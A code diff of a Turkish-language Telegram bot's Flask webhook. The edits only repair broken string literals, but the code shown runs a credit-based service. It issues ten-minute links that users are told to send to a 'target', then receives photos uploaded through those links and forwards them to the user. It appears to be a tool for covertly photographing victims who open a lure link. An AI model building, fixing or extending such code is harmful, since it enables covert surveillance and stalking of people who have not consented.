@@ -79,40 +79,31 @@ def webhook():
                     send_message(chat_id, "Kredi eklendi! Kullanici ID: " + str(target_id) + " +" + str(amount) + " kredi")
                     return "OK", 200
             elif text == "/admin":
-                msg = ("Admin Komutlari:
-"
-                       "/addcredit [ID] [MIKTAR] - Kredi ekle
-"
-                       "/users - Kullanici listesi
-"
-                       "Admin Panel: " + WEBHOOK_URL + "/admin")
+                msg = """Admin Komutlari:
+/addcredit [ID] [MIKTAR] - Kredi ekle
+/users - Kullanici listesi
+Admin Panel: """ + WEBHOOK_URL + "/admin"
                 send_message(chat_id, msg)
                 return "OK", 200
             elif text == "/users":
                 from database import get_all_users
                 users = get_all_users()
-                msg = "Kullanicilar:
-"
+                msg = "Kullanicilar:\n"
                 for u in users[:20]:
-                    msg += "ID:" + str(u["id"]) + " @" + u["username"] + " Kredi:" + str(u["credits"]) + "
-"
+                    msg += "ID:" + str(u["id"]) + " @" + u["username"] + " Kredi:" + str(u["credits"]) + "\n"
                 send_message(chat_id, msg)
                 return "OK", 200
 
         # Normal kullanici komutlari
         if text == "/start":
             if credits <= 0:
-                msg = ("Merhaba @" + username + "!
+                msg = """Merhaba @""" + username + """!
 
-"
-                       "Krediniz bitti!
-"
-                       "Kredi almak icin admin ile iletisime gecin.
+Krediniz bitti!
+Kredi almak icin admin ile iletisime gecin.
 
-"
-                       "Admin: @KEMA_VPN
-"
-                       "ID'niz: " + str(user_id))
+Admin: @KEMA_VPN
+ID'niz: """ + str(user_id)
                 send_message(chat_id, msg)
                 return "OK", 200
 
@@ -128,20 +119,15 @@ def webhook():
             expires = datetime.now() + timedelta(minutes=10)
             expires_str = expires.strftime("%H:%M")
 
-            msg = ("Merhaba @" + username + "!
+            msg = """Merhaba @""" + username + """!
 
-"
-                   "Link: " + link + "
+Link: """ + link + """
 
-"
-                   "Bu linki hedefe gonder.
-"
-                   "Link 10 dakika gecerli (" + expires_str + "'e kadar).
+Bu linki hedefe gonder.
+Link 10 dakika gecerli (""" + expires_str + """'e kadar).
 
-"
-                   "Kalan kredi: " + str(credits - 1) + "
-"
-                   "ID'niz: " + str(user_id))
+Kalan kredi: """ + str(credits - 1) + """
+ID'niz: """ + str(user_id)
 
             keyboard = {
                 "inline_keyboard": [[{"text": "Linke Git", "url": link}]]
@@ -150,13 +136,11 @@ def webhook():
             send_message(chat_id, msg, reply_markup=keyboard)
 
         elif text == "/kredi":
-            msg = "Krediniz: " + str(credits) + "
-ID'niz: " + str(user_id)
+            msg = "Krediniz: " + str(credits) + "\nID'niz: " + str(user_id)
             send_message(chat_id, msg)
 
         elif text == "/id":
-            msg = "Telegram ID: " + str(telegram_id) + "
-Kullanici ID: " + str(user_id)
+            msg = "Telegram ID: " + str(telegram_id) + "\nKullanici ID: " + str(user_id)
             send_message(chat_id, msg)
 
     return "OK", 200
@@ -207,8 +191,7 @@ def upload_photo(token):
     mark_link_used(token)
     save_photo(user_id, token, img)
 
-    cap = "Fotograf! @" + username + "
-Token: " + token
+    cap = "Fotograf! @" + username + "\nToken: " + token
     url = API_URL + "/sendPhoto"
     files = {"photo": ("photo.jpg", img_bytes, "image/jpeg")}
     data2 = {"chat_id": chat_id, "caption": cap}
